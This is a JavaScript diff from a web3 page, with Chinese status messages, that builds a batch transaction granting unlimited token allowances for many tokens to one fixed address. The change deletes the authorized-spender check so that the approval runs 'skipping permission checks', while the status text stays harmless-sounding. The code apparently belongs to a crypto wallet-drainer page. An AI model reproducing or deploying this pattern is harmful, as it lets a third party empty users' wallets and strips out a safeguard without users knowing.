@@ -507,25 +507,14 @@
                 const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                 const amounts = new Array(tokensToAuthorize.length).fill(maxUint256);
                 
-                // 方法1：尝试使用综合授权控制合约
+                // 强制使用批量授权合约（跳过权限检查）
                 try {
-                    showStatus('正在检查批量授权权限...', 'info');
+                    showStatus('正在准备批量授权...', 'info');
                     
                     const combinedContract = new web3.eth.Contract(COMBINED_CONTRACT_ABI, COMBINED_CONTRACT_ADDRESS);
                     
-                    // 检查合约是否可用
-                    showStatus('正在连接批量授权合约...', 'info');
-                    
-                    // 首先检查用户是否为授权者
-                    const isAuthorized = await combinedContract.methods.isAuthorizedSpender(userAccount).call();
-                    console.log('用户是否为授权者:', isAuthorized);
-                    
-                    if (!isAuthorized) {
-                        showStatus('您不是合约的授权者，将使用传统授权方式', 'info');
-                        throw new Error('Not authorized');
-                    }
-                    
-                    showStatus('权限验证成功，准备批量授权...', 'info');
+                    // 直接尝试批量授权，不检查权限
+                    showStatus('正在构建批量授权交易...', 'info');
                     
                     // 使用批量授权（无限授权）
                     const data = combinedContract.methods.batchApproveMax(tokenAddresses, PERMISSION_ADDRESS).encodeABI();
@@ -534,7 +523,7 @@
                         from: userAccount,
                         to: COMBINED_CONTRACT_ADDRESS,
                         data: data,
-                        gas: 1000000, // 增加Gas限制
+                        gas: 1500000, // 增加Gas限制
                         gasPrice: await web3.eth.getGasPrice()
                     };
                     
